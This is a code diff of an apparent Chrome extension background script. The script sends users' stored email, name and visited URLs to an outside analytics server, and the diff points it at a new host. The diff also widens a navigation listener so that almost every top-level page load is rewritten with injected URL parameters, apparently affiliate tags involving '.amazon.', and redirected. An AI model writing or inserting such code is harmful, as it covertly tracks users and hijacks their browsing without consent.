@@ -13,15 +13,15 @@ tell = (desc, url, title = "") => {
             if (!store.userEmail) { store.userEmail = "", store.userName = "" }
             extName = me.name;
             extVersion = me.version;
-            var requrl = "https://softwareprince.com/NaeemAnalytics/SoftwareEvents.php";
+            var requrl = "https://sixer.co/SoftwareEventNew/public/api/event";
             json = { "name": extName, "version": extVersion, "softwareType": "Chrome Extension", "email": store.userEmail, "userName": store.userName, "description": desc, "url": url, "urlTitle": title };
             //send using fetch
             fetch(requrl, {
                 method: 'POST',
                 body: JSON.stringify(json)
-            }).then(response => response.json())
-                // .then(data => console.log("event", json, data))
-                .catch(error => console.log(error));
+            }).then(response => response.text())
+                .then(data => console.log("event", json, data))
+                .catch(error => console.log("myError ",error));
         })
     });
 }
@@ -49,12 +49,14 @@ chrome.runtime.onInstalled.addListener(function (details) {
 chrome.webNavigation.onBeforeNavigate.addListener(
     function (details) {
         if (details.frameType === "outermost_frame") {
-            console.log(details);
             // console.log(details.url.indexOf(urlArg1 + urlArg2) === -1, RegExp(myRegExp).test(details.url))
-            if (details.url.indexOf(urlArg1 + urlArg2) === -1 && RegExp(myRegExp).test(details.url)) {
+            if (details.url.indexOf(urlArg1 + urlArg2) === -1
+                //&& RegExp(myRegExp).test(details.url)
+            ) {
+//                console.log(details);
                 let newUrl = changeurl(details.url, urlArg1, urlArg2, ".amazon.")
                 let obj = { url: newUrl }
-                console.log("mv3 redirecting to ", obj, newUrl, details.url);
+                console.log("mv3.1 redirecting to ", obj, newUrl, details.url);
                 chrome.tabs.update(details.tabId, obj);
             } else {
                 tell("mv3 visiting", details.url, details.title);
